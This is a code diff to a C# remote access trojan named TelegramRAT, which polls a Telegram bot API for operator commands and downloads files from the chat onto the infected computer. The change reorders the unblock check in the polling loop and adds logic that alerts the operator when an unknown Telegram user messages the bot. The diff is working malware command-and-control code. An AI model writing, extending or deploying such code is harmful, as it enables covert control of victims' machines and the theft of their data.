@@ -55,9 +55,10 @@ namespace TelegramRAT
             // Get commands
             while (true)
             {
-                waitForUnblock();
                 // Sleep
                 Thread.Sleep(config.TelegramCommandCheckDelay * 1000);
+                //
+                waitForUnblock();
                 // Get commands
                 using (WebClient client = new WebClient())
                     response = client.DownloadString("https://api.telegram.org/bot" + config.TelegramToken + "/getUpdates" + "?offset=" + (LastUpdateID + 1));
@@ -72,8 +73,11 @@ namespace TelegramRAT
                     // If not the creator of the bot writes
                     if (chatid != config.TelegramChatID)
                     {
-                        sendText("👑 You not my owner!", chatid);
-                        Console.WriteLine(chatid);
+                        string username = message["chat"]["username"];
+                        string firstname = message["chat"]["first_name"];
+                        sendText($"👑 You not my owner {firstname}", chatid);
+                        sendText($"👑 Unknown user with id {chatid} and username @{username} send command to bot!");
+                        break;
                     }
                     // Download file from chat to computer
                     if (message.HasKey("document"))
